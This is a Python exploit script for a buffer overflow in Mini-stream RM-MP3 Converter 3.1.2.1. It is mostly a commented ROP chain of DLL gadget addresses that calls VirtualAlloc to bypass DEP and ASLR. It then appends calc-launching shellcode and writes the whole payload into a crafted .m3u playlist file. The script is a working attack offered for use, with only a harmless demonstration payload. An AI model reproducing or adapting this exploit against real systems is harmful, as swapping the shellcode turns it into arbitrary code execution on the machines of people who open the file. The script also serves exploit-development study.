#!/usr/bin/python
 
import sys, struct
####################################################
# ROP Exploit (DEP + ASLR Bypass)                  #
# Mini-stream RM-MP3 Converter version 3.1.2.1     #
# Author: un4ckn0wl3z                              #
# Site: https://haxtivitiez.wordpress.com/         #
# Thank: Fuzzysecurity                             #
####################################################

file="crash.m3u"
#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 => Nop                                                 #
# ECX 00000040 => flProtect                                           #
# EDX 00001000 => flAllocationType                                    #
# EBX 00000001 => dwSize                                              #
# ESP ???????? => Leave as is                                         #
# EBP ???????? => Call to ESP (jmp, call, push,..)                    #
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 0x1002a602 => ROP-Nop same as EIP                               #
#---------------------------------------------------------------------#
 
rop = struct.pack('<L',0x41414141)  # padding to compensate 4-bytes at ESP
"""
(1) EDI -> We need to put a ROP-Nop in EDI
0x10029b57 # POP EDI # RETN
0x1002a602 # ROP-Nop (we already have this value from EIP)
"""
rop += struct.pack('<L',0x10029b57)
rop += struct.pack('<L',0x1002a602)
"""
(7) ECX -> flProtect (0x40)
(This technique works because EDX points to a valid memory location at run-time!! I tested this on windows
XP and there it didn't seem to be the case. It would be an interesting exercise to make this gadget more
universal.)
0x1001db62 # POP ECX # RETN
0xffffffff # will become 0x40 (ECX will be set to 0xffffffff)
0x1002e01b # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN  \ ECX will be set to 0x00000001
0x1002e01b # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN  /
0x1002a487 # ADD ECX,ECX # RETN  \
0x1002a487 # ADD ECX,ECX # RETN   |
0x1002a487 # ADD ECX,ECX # RETN   | Adding ECX to itself cycles ECX -> 1,2,4,8,10,20,40 -> 0x00000040
0x1002a487 # ADD ECX,ECX # RETN   |
0x1002a487 # ADD ECX,ECX # RETN   |
0x1002a487 # ADD ECX,ECX # RETN  /
"""
rop += struct.pack('<L',0x1001db62)
rop += struct.pack('<L',0xffffffff)
rop += struct.pack('<L',0x1002e01b)
rop += struct.pack('<L',0x1002e01b)
rop += struct.pack('<L',0x1002a487)
rop += struct.pack('<L',0x1002a487)
rop += struct.pack('<L',0x1002a487)
rop += struct.pack('<L',0x1002a487)
rop += struct.pack('<L',0x1002a487)
rop += struct.pack('<L',0x1002a487)
"""
(8) ESI -> VirtualAlloc
(We already have a pointer to VirtualAlloc (0x1005d060) but we need the DWORD value that is located at
that pointer. Again here EBP points to a valid memory address (untested on XP).)
0x1003143f # POP EAX # RETN
0x1005d060 # kernel32.virtualalloc
0x10027f59 # MOV EAX,DWORD PTR DS:[EAX] # RETN (get the DWORD value located at 0x1005d060)
0x1005bb8e # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN (EAX -> ESI)
"""
rop += struct.pack('<L',0x1003143f)
rop += struct.pack('<L',0x1005d060)
rop += struct.pack('<L',0x10027f59)
rop += struct.pack('<L',0x1005bb8e)

"""
(6) EDX -> flAllocationType (0x1000)
0x1003fb3f # MOV EDX,E58B0001 # POP EBP # RETN (we move a static value into EDX for calculations)
0x41414141 # padding for POP EBP (compensation for the POP)
0x10020837 # POP EBX # RETN
0x1A750FFF # ebx+edx => 0x1000 flAllocationType (FFFFFFFF-E58B0001=1A74FFFE => 1A74FFFE+00001001=1A750FFF)
0x10029f3e # ADD EDX,EBX # POP EBX # RETN 10 (when we add these valuse together the result is 0x00001000)
0x1002a602 # Rop-Nop to compensate  \
0x1002a602 # Rop-Nop to compensate   |
0x1002a602 # Rop-Nop to compensate   | This is to compensate for the POP and RETN 10
0x1002a602 # Rop-Nop to compensate   |
0x1002a602 # Rop-Nop to compensate   |
0x1002a602 # Rop-Nop to compensate  /
"""
rop += struct.pack('<L',0x1003fb3f)
rop += struct.pack('<L',0x41414141)
rop += struct.pack('<L',0x10020837)
rop += struct.pack('<L',0x1A750FFF)
rop += struct.pack('<L',0x10029f3e)
rop += struct.pack('<L',0x1002a602)
rop += struct.pack('<L',0x1002a602)
rop += struct.pack('<L',0x1002a602)
rop += struct.pack('<L',0x1002a602)
rop += struct.pack('<L',0x1002a602)
rop += struct.pack('<L',0x1002a602)
"""
(2) EBP -> Redirect Execution flow to ESP
0x1004d10e # POP EBP # RETN
0x100371f5 # CALL ESP (!mona jmp -r ESP -m MSRMfilter03.dll -cpb '\x00\x09\x0a')
"""
rop += struct.pack('<L',0x1004d10e)
rop += struct.pack('<L',0x100371f5)
"""
(5) EBX -> dwSize (0x1)
0x10020837 # POP EBX # RETN
0xffffffff # will be 0x1 (EBX will be set to 0xffffffff)
0x100319d3 # INC EBX # FPATAN # RETN  \ Increasing EBX twice will set EBX to 0x00000001
0x100319d3 # INC EBX # FPATAN # RETN  /
"""
rop += struct.pack('<L',0x10020837)
rop += struct.pack('<L',0xffffffff)
rop += struct.pack('<L',0x100319d3)
rop += struct.pack('<L',0x100319d3)
"""
(3) EAX -> Fill with a regular NOP
0x1002ca2d # POP EAX # RETN
0x90909090 # NOP (just a regular NOP)
"""
rop += struct.pack('<L',0x1002ca2d)
rop += struct.pack('<L',0x90909090)
"""
(4) We need to end our chain with a PUSHAD
0x10014720 # PUSHAD # RETN (can be found in rop_virtualprotect.txt(rop_chains.txt)) 
"""
rop += struct.pack('<L',0x10014720)

# SkyLined's Calc shellcode
calc = (
"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7")
#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: Address=0x1005D060 (MSRMfilter03.dll)        #
# EIP: 0x1002a602,  # RETN (ROP NOP) [MSRMfilter03.dll]               #
#---------------------------------------------------------------------#
shell = "\x90"*5 + calc
crash = "http://." + "A"*17416 + "\x02\xa6\x02\x10" + rop + shell + "C"*(7572-len(rop+shell))
 
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()
